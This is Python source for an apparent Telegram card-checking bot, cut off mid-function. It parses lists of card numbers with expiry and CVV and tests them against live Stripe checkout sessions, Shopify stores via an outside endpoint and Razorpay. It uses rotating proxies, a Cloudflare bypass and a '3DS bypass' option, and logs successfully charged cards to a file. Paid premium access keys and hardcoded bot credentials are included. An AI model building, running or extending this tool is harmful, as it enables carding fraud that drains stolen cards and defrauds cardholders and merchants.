from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonCallback
import requests, random, datetime, json, os, re, asyncio, time
import string
import hashlib
import aiohttp
import aiofiles
from urllib.parse import urlparse, quote
import cloudscraper


# Config
API_ID = 21902589
API_HASH = "646d988e7c7938f85ca652ece00b07ba"
BOT_TOKEN = "8741520976:AAFgMrXI-WZVb2V4CYvDtoS_BDDbXuqGZlU" # Replace with your Bot Token
ADMIN_ID = [7742548417] # Replace with your Admin ID(s)
GROUP_ID = -1003518846194 # Replace with your Group ID

# Files
PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "proxy.json"

ACTIVE_MTXT_PROCESSES = {}
TEMP_WORKING_SITES = {}  # Store working sites temporarily for /check command
ACTIVE_RZP_PROCESSES = {}  # Store active Razorpay checking processes

# Default Razorpay site
DEFAULT_RZP_SITE = "https://pages.razorpay.com/pl_J1vTgGrsLKbLWy/view"
RZP_API_ENDPOINT = "https://rzp.victus.name/rzpv2"

# Default Stripe Auth sites (will rotate)
DEFAULT_STRIPE_SITES = ["kabusvuya.com", "associationsmanagement.com"]
STRIPE_API_ENDPOINT = "https://blackxcard-autostripe.onrender.com/gateway=autostripe/key=Blackxcard"

ACTIVE_STRIPE_PROCESSES = {}  # Store active Stripe Auth checking processes

# ========== NEW CHECKOUT INTEGRATION ==========
# Checkout constants and session
CO_HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "stripe-version": "2020-08-27",
    "x-stripe-client-user-agent": '{"bindings_version":"5.26.0","lang":"JavaScript","lang_version":"Chrome 120","platform":"Web","publisher":"stripe","uname":"","stripe_js_id":"stripe-js-v3"}'
}

_co_session = None

async def get_co_session():
    global _co_session
    if _co_session is None or _co_session.closed:
        _co_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=25, connect=8)
        )
    return _co_session

def extract_co_url(text: str) -> str:
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            url = m.group(0).rstrip('.,;:')
            return url
    return None

def decode_co_pk(url: str) -> dict:
    result = {"pk": None, "cs": None, "site": None}
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        if '#' not in url:
            return result
        hash_part = url.split('#')[1]
        hash_decoded = unquote(hash_part)
        try:
            decoded_bytes = base64.b64decode(hash_decoded)
            xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
            pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
            if pk_match:
                result["pk"] = pk_match.group(0)
            site_match = re.search(r'https?://[^\s"\'\<\>]+', xored)
            if site_match:
                result["site"] = site_match.group(0)
        except:
            pass
    except:
        pass
    return result

def parse_co_card(text: str) -> dict:
    text = text.strip()
    parts = re.split(r'[|:/\-\s]+', text)
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

def parse_co_cards(text: str) -> list:
    cards = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if line:
            card = parse_co_card(line)
            if card:
                cards.append(card)
    return cards

async def get_checkout_info(url: str) -> dict:
    start = time.perf_counter()
    result = {
        "url": url, "pk": None, "cs": None, "merchant": None, "price": None,
        "currency": None, "product": None, "country": None, "mode": None,
        "customer_name": None, "customer_email": None, "support_email": None,
        "support_phone": None, "cards_accepted": None, "success_url": None,
        "cancel_url": None, "init_data": None, "error": None, "time": 0
    }
    try:
        decoded = decode_co_pk(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        if not result["pk"]:
            result["error"] = "Could not decode PK from URL"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        if not result["cs"]:
            result["error"] = "Could not extract CS from URL"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        pk_for_init = result["pk"]
        s = await get_co_session()
        body = f"key={pk_for_init}&eid=NA&browser_locale=en-US&redirect_type=url"
        async with s.post(f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init", headers=CO_HEADERS, data=body) as r:
            init_data = await r.json()
        if "error" not in init_data:
            result["init_data"] = init_data
            acc = init_data.get("account_settings", {})
            result["merchant"] = acc.get("display_name") or acc.get("business_name")
            result["support_email"] = acc.get("support_email")
            result["support_phone"] = acc.get("support_phone")
            result["country"] = acc.get("country")
            lig = init_data.get("line_item_group")
            inv = init_data.get("invoice")
            if lig:
                result["price"] = lig.get("total", 0) / 100
                result["currency"] = lig.get("currency", "").upper()
                if lig.get("line_items"):
                    items = lig["line_items"]
                    currency = lig.get("currency", "").upper()
                    sym = {"USD": "$", "EUR": "€", "GBP": "£", "INR": "₹"}.get(currency, "")
                    product_parts = []
                    for item in items:
                        qty = item.get("quantity", 1)
                        name = item.get("name", "Product")
                        amt = item.get("amount", 0) / 100
                        interval = item.get("recurring_interval")
                        if interval:
                            product_parts.append(f"{qty} × {name} (at {sym}{amt:.2f} / {interval})")
                        else:
                            product_parts.append(f"{qty} × {name} ({sym}{amt:.2f})")
                    result["product"] = ", ".join(product_parts)
            elif inv:
                result["price"] = inv.get("total", 0) / 100
                result["currency"] = inv.get("currency", "").upper()
            mode = init_data.get("mode", "")
            if mode:
                result["mode"] = mode.upper()
            elif init_data.get("subscription"):
                result["mode"] = "SUBSCRIPTION"
            else:
                result["mode"] = "PAYMENT"
            cust = init_data.get("customer") or {}
            result["customer_name"] = cust.get("name")
            result["customer_email"] = init_data.get("customer_email") or cust.get("email")
            pm_types = init_data.get("payment_method_types") or []
            if pm_types:
                cards = [t.upper() for t in pm_types if t != "card"]
                if "card" in pm_types:
                    cards.insert(0, "CARD")
                result["cards_accepted"] = ", ".join(cards) if cards else "CARD"
            result["success_url"] = init_data.get("success_url")
            result["cancel_url"] = init_data.get("cancel_url")
        else:
            result["error"] = init_data.get("error", {}).get("message", "Init failed")
    except Exception as e:
        result["error"] = str(e)
    result["time"] = round(time.perf_counter() - start, 2)
    return result

async def charge_co_card(card: dict, checkout_data: dict, proxy_str: str = None, bypass_3ds: bool = False, max_retries: int = 2) -> dict:
    start = time.perf_counter()
    card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
    result = {"card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", "status": None, "response": None, "time": 0}
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    for attempt in range(max_retries + 1):
        try:
            proxy_url = None
            if proxy_str:
                parts = proxy_str.split(':')
                if len(parts) == 4:
                    proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                elif len(parts) == 2:
                    proxy_url = f"http://{parts[0]}:{parts[1]}"
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                email = init_data.get("customer_email") or "john@example.com"
                checksum = init_data.get("init_checksum", "")
                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
                elif inv:
                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
                else:
                    pi = init_data.get("payment_intent") or {}
                    total = subtotal = pi.get("amount", 0)
                cust = init_data.get("customer") or {}
                addr = cust.get("address") or {}
                name = cust.get("name") or "John Smith"
                country = addr.get("country") or "US"
                line1 = addr.get("line1") or "476 West White Mountain Blvd"
                city = addr.get("city") or "Pinetop"
                state = addr.get("state") or "AZ"
                zip_code = addr.get("postal_code") or "85929"
                pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&payment_user_agent=stripe.js%2Facacia+card%2Fcheckout&referrer=https%3A%2F%2Fcheckout.stripe.com&key={pk}"
                async with s.post("https://api.stripe.com/v1/payment_methods", headers=CO_HEADERS, data=pm_body, proxy=proxy_url) as r:
                    pm = await r.json()
                if "error" in pm:
                    err_msg = pm["error"].get("message", "Card error")
                    result["status"] = "DECLINED"
                    result["response"] = err_msg
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                pm_id = pm.get("id")
                if not pm_id:
                    result["status"] = "FAILED"
                    result["response"] = "No PM"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
                if bypass_3ds:
                    conf_body += "&return_url=https://checkout.stripe.com"
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=CO_HEADERS, data=conf_body, proxy=proxy_url) as r:
                    conf = await r.json()
                if "error" in conf:
                    err = conf["error"]
                    dc = err.get("decline_code", "")
                    msg = err.get("message", "Failed")
                    result["status"] = "DECLINED"
                    result["response"] = f"{dc.upper()}: {msg}" if dc else msg
                else:
                    pi = conf.get("payment_intent") or {}
                    st = pi.get("status", "") or conf.get("status", "")
                    if st == "succeeded":
                        result["status"] = "CHARGED"
                        result["response"] = "Payment Successful"
                    elif st == "requires_action":
                        if bypass_3ds:
                            result["status"] = "3DS SKIP"
                            result["response"] = "3DS Cannot be bypassed"
                        else:
                            result["status"] = "3DS"
                            result["response"] = "3DS Required"
                    elif st == "requires_payment_method":
                        result["status"] = "DECLINED"
                        result["response"] = "Card Declined"
                    else:
                        result["status"] = "UNKNOWN"
                        result["response"] = st or "Unknown"
                result["time"] = round(time.perf_counter() - start, 2)
                return result
        except Exception as e:
            err_str = str(e)
            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = err_str[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            return result
    return result

async def check_checkout_active(pk: str, cs: str) -> bool:
    try:
        s = await get_co_session()
        body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
        async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/init", headers=CO_HEADERS, data=body, timeout=aiohttp.ClientTimeout(total=5)) as r:
            data = await r.json()
            return "error" not in data
    except:
        return False

# ========== END NEW CHECKOUT INTEGRATION ==========


# --- Utility Functions ---

async def create_json_file(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as file:
                await file.write(json.dumps({}))
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE]:
        await create_json_file(file)

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            await create_json_file(filename)
        async with aiofiles.open(filename, "r") as f:
            content = await f.read()
            return json.loads(content)
    except Exception as e:
        print(f"Error loading {filename}: {str(e)}")
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=4))
    except Exception as e:
        print(f"Error saving {filename}: {str(e)}")

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def is_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data: return False
    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
    current_date = datetime.datetime.now()
    if current_date > expiry_date:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return False
    return True

async def add_premium_user(user_id, days):
    premium_users = await load_json(PREMIUM_FILE)
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days
    }
    await save_json(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    if str(user_id) in premium_users:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return True
    return False

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):
    banned_users = await load_json(BANNED_FILE)
    banned_users[str(user_id)] = {
        'banned_at': datetime.datetime.now().isoformat(),
        'banned_by': banned_by
    }
    await save_json(BANNED_FILE, banned_users)

async def unban_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        await save_json(BANNED_FILE, banned_users)
        return True
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200: return "BIN Info Not Found", "-", "-", "-", "-", "🏳️"
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '🏳️')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError: return "-", "-", "-", "-", "-", "🏳️"
    except Exception: return "-", "-", "-", "-", "-", "🏳️"

def normalize_card(text):
    if not text: return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16: cc = part
        elif len(part) == 4 and part.startswith('20'): yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '': mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '': yy = part
        elif len(part) in [3, 4] and cvv == '': cvv = part
    if cc and mm and yy and cvv: return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_json_from_response(response_text):
    if not response_text: return None
    start_index = response_text.find('{')
    if start_index == -1: return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{': brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1: return None
    json_text = response_text[start_index:end_index + 1]
    try: return json.loads(json_text)
    except json.JSONDecodeError: return None

async def get_user_proxy(user_id):
    """Get a random proxy for a specific user"""
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    
    if not user_proxies:
        return None
    
    # Return a random proxy - user_proxies is a list, so we need to check if it's not empty
    if len(user_proxies) == 0:
        return None
    
    return random.choice(user_proxies)

async def remove_dead_proxy(user_id, proxy_url):
    """Remove a dead proxy from user's list"""
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    
    # Find and remove the dead proxy
    for proxy_data in user_proxies:
        if proxy_data['proxy_url'] == proxy_url:
            user_proxies.remove(proxy_data)
            
            if user_proxies:
                proxies[str(user_id)] = user_proxies
            else:
                del proxies[str(user_id)]
            
            await save_json(PROXY_FILE, proxies)
            break

async def get_all_user_proxies(user_id):
    """Get all proxies for a specific user"""
    proxies = await load_json(PROXY_FILE)
    return proxies.get(str(user_id), [])

async def check_card_random_site(card, sites, user_id=None):
    if not sites: return {"Response": "ERROR", "Price": "-", "Gateway": "-"}, -1
    selected_site = random.choice(sites)
    site_index = sites.index(selected_site) + 1
    
    # Get user proxy if available
    proxy_data = await get_user_proxy(user_id) if user_id else None
    
    try:
        # Ensure site has proper format
        if not selected_site.startswith('http'):
            selected_site = f'https://{selected_site}'
        
        # Build proxy string in format: ip:port:username:password
        proxy_str = None
        if proxy_data:
            ip = proxy_data.get('ip')
            port = proxy_data.get('port')
            username = proxy_data.get('username')
            password = proxy_data.get('password')
            
            if username and password:
                proxy_str = f"{ip}:{port}:{username}:{password}"
            else:
                proxy_str = f"{ip}:{port}"
        
        # Build API URL with new endpoint
        url = f'https://xaeden.onrender.com/sh?cc={card}&url={selected_site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: 
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}, site_index
                
                try:
                    response_json = await res.json()
                except:
                    # If JSON parsing fails, try to get text
                    response_text = await res.text()
                    return {"Response": f"Invalid JSON response: {response_text[:100]}", "Price": "-", "Gateway": "-"}, site_index
                
                # Parse the new API response format
                api_response = response_json.get('Response', '')
                price = response_json.get('Price', '-')
                if price != '-':
                    price = f"${price}"
                
                gateway = response_json.get('Gate', 'Shopify')
                
                # Check for proxy errors and remove dead proxy
                if proxy_data and user_id and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                    return {
                        "Response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy",
                        "Price": "-",
                        "Gateway": "-",
                        "Status": "Proxy Dead"
                    }, site_index
                
                # Check for charged status
                if "Order completed" in api_response or "💎" in api_response:
                    return {
                        "Response": api_response,
                        "Price": price,
                        "Gateway": gateway,
                        "Status": "Charged"
                    }, site_index
                else:
                    # Return the response as is
                    return {
                        "Response": api_response,
                        "Price": price,
                        "Gateway": gateway,
                        "Status": api_response
                    }, site_index
                    
    except Exception as e: 
        return {"Response": str(e), "Price": "-", "Gateway": "-"}, site_index

async def check_card_specific_site(card, site, user_id=None):
    # Get user proxy if available
    proxy_data = await get_user_proxy(user_id) if user_id else None
    
    try:
        # Ensure site has proper format
        if not site.startswith('http'):
            site = f'https://{site}'
        
        # Build proxy string in format: ip:port:username:password
        proxy_str = None
        if proxy_data:
            ip = proxy_data.get('ip')
            port = proxy_data.get('port')
            username = proxy_data.get('username')
            password = proxy_data.get('password')
            
            if username and password:
                proxy_str = f"{ip}:{port}:{username}:{password}"
            else:
                proxy_str = f"{ip}:{port}"
        
        # Build API URL with new endpoint
        url = f'https://xaeden.onrender.com/sh?cc={card}&url={site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: 
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}
                
                try:
                    response_json = await res.json()
                except:
                    # If JSON parsing fails, try to get text
                    response_text = await res.text()
                    return {"Response": f"Invalid JSON response: {response_text[:100]}", "Price": "-", "Gateway": "-"}
                
                # Parse the new API response format
                api_response = response_json.get('Response', '')
                price = response_json.get('Price', '-')
                if price != '-':
                    price = f"${price}"
                
                gateway = response_json.get('Gate', 'Shopify')
                
                # Check for proxy errors and remove dead proxy
                if proxy_data and user_id and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                    return {
                        "Response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy",
                        "Price": "-",
                        "Gateway": "-",
                        "Status": "Proxy Dead"
                    }
                
                # Check for charged status
                if "Order completed" in api_response or "💎" in api_response:
                    return {
                        "Response": api_response,
                        "Price": price,
                        "Gateway": gateway,
                        "Status": "Charged"
                    }
                else:
                    # Return the response as is
                    return {
                        "Response": api_response,
                        "Price": price,
                        "Gateway": gateway,
                        "Status": api_response
                    }
                    
    except Exception as e: 
        return {"Response": str(e), "Price": "-", "Gateway": "-"}

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card: cards.add(card)
    return list(cards)

async def is_registered_user(user_id):
    """Check if user is registered (has sites, premium, or in free_users)"""
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    is_premium = await is_premium_user(user_id)
    free_users = await load_json(FREE_FILE)
    is_in_free = str(user_id) in free_users
    return user_sites or is_premium or is_in_free

async def can_use(user_id, chat):
    # Admin always has access
    if user_id in ADMIN_ID:
        return True, "admin"
    
    if await is_banned_user(user_id):
        return False, "banned"

    is_premium = await is_premium_user(user_id)
    is_private = chat.id == user_id

    if is_private:
        if is_premium:
            return True, "premium_private"
        else:
            # Free users (registered or not) cannot use bot in private
            return False, "no_access"
    else:  # In a group
        if is_premium:
            return True, "premium_group"
        else:
            return True, "group_free"

def get_cc_limit(access_type, user_id=None):
    # Admin has unlimited access
    if user_id and user_id in ADMIN_ID:
        return 999999  # Unlimited for admin
    if access_type in ["premium_private", "premium_group"]:
        return 5000
    elif access_type == "group_free":
        return 100
    return 0

async def save_approved_card(card, status, response, gateway, price):
    try:
        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
            await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
    except Exception as e: print(f"Error saving card to {CC_FILE}: {str(e)}")

async def pin_charged_message(event, message):
    try:
        if event.is_group: await message.pin()
    except Exception as e: print(f"Failed to pin message: {e}")

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try: parsed = urlparse(url)
        except: return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line): clean_urls.add(cleaned_line)
    return list(clean_urls)

def parse_proxy_format(proxy):
    """Parse proxy in multiple formats with protocol support"""
    import re
    
    proxy = proxy.strip()
    proxy_type = 'http'  # default
    
    # Check if protocol is specified (socks5://, socks4://, http://, https://)
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    
    host = ''
    port = ''
    username = ''
    password = ''
    
    # Format: username:password@host:port
    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    # Format: host:port@username:password
    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    # Format: host:port:username:password (check if 2nd part is valid port)
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        potential_host, potential_port, potential_user, potential_pass = match.groups()
        # Validate port number
        if 0 < int(potential_port) <= 65535:
            host, port, username, password = potential_host, potential_port, potential_user, potential_pass
    # Format: host:port (no authentication)
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    else:
        return None
    
    # Validate that we have at least host and port
    if not host or not port:
        return None
    
    # Validate port is numeric and in valid range
    try:
        port_num = int(port)
        if port_num <= 0 or port_num > 65535:
            return None
    except ValueError:
        return None
    
    # Build proxy URL based on type and authentication
    if username and password:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
        else:
            proxy_url = f'http://{username}:{password}@{host}:{port}'
    else:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{host}:{port}'
        else:
            proxy_url = f'http://{host}:{port}'
    
    return {
        'ip': host,
        'port': port,
        'username': username if username else None,
        'password': password if password else None,
        'proxy_url': proxy_url,
        'type': proxy_type
    }

async def test_proxy(proxy_url):
    """Test if proxy is working"""
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
                    data = await res.json()
                    return True, data.get('ip', 'Unknown')
                return False, None
    except Exception as e:
        return False, str(e)

def is_site_dead(response_text):
    if not response_text: return True
    response_lower = response_text.lower()
    dead_indicators = [
        'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'HTTPERROR504', 'http error',
    'httperror504', 'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
        'gateway timeout', 'network error', 'connection reset', 
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
        'url rejected', 'malformed input', 'amount_too_small', 'amount too small','SITE DEAD', 'site dead',
        'CAPTCHA_REQUIRED', 'captcha_required', 'captcha required', 'Site errors', 'Site errors: Failed to tokenize card', 'Failed'
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    try:
        # Ensure site has proper format
        if not site.startswith('http'):
            site = f'https://{site}'
        
        # Get user proxy if available
        proxy_data = await get_user_proxy(user_id) if user_id else None
        
        # Build proxy string in format: ip:port:username:password
        proxy_str = None
        if proxy_data:
            ip = proxy_data.get('ip')
            port = proxy_data.get('port')
            username = proxy_data.get('username')
            password = proxy_data.get('password')
            
            if username and password:
                proxy_str = f"{ip}:{port}:{username}:{password}"
            else:
                proxy_str = f"{ip}:{port}"
        
        # Use the new endpoint
        url = f'https://xaeden.onrender.com/sh?cc={test_card}&url={site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: 
                    return {"status": "dead", "response": f"HTTP {res.status}", "site": site, "price": "-"}
                
                try:
                    response_json = await res.json()
                except:
                    response_text = await res.text()
                    return {"status": "dead", "response": f"Invalid JSON: {response_text[:100]}", "site": site, "price": "-"}
                
                # Parse the new API response format
                response_msg = response_json.get("Response", "")
                price = response_json.get("Price", "-")
                if price != '-':
                    price = f"${price}"
                
                # Check for proxy errors and remove dead proxy
                if proxy_data and user_id and ('proxy' in response_msg.lower() or 'connection' in response_msg.lower() or 'timeout' in response_msg.lower()):
                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                    return {"status": "proxy_dead", "response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy", "site": site, "price": "-"}
                
                if is_site_dead(response_msg): 
                    return {"status": "dead", "response": response_msg, "site": site, "price": price}
                else: 
                    return {"status": "working", "response": response_msg, "site": site, "price": price}
    except Exception as e: 
        return {"status": "dead", "response": str(e), "site": site, "price": "-"}



async def check_card_razorpay(card, amount="1", user_id=None):
    """Check a card using Razorpay endpoint with cloudscraper"""
    # Get user proxy if available
    proxy_data = await get_user_proxy(user_id) if user_id else None

    try:
        # Build Razorpay API URL
        url = f'{RZP_API_ENDPOINT}?cc={card}&site={DEFAULT_RZP_SITE}&amount={amount}'

        # Build proxy dict
        proxies = None
        if proxy_data:
            proxy_url = proxy_data.get('proxy_url')
            proxies = {"http": proxy_url, "https": proxy_url}

        loop = asyncio.get_event_loop()
        
        def make_request():
            try:
                # Create cloudscraper instance (bypasses Cloudflare)
                scraper = cloudscraper.create_scraper()
                
                res = scraper.get(
                    url,
                    timeout=100,
                    proxies=proxies
                )
                return res
            except Exception as e:
                return e
        
        # Run in executor to make it async
        res = await loop.run_in_executor(None, make_request)
        
        # Check if exception was returned
        if isinstance(res, Exception):
            error_str = str(res)
            if 'proxy' in error_str.lower() and user_id:
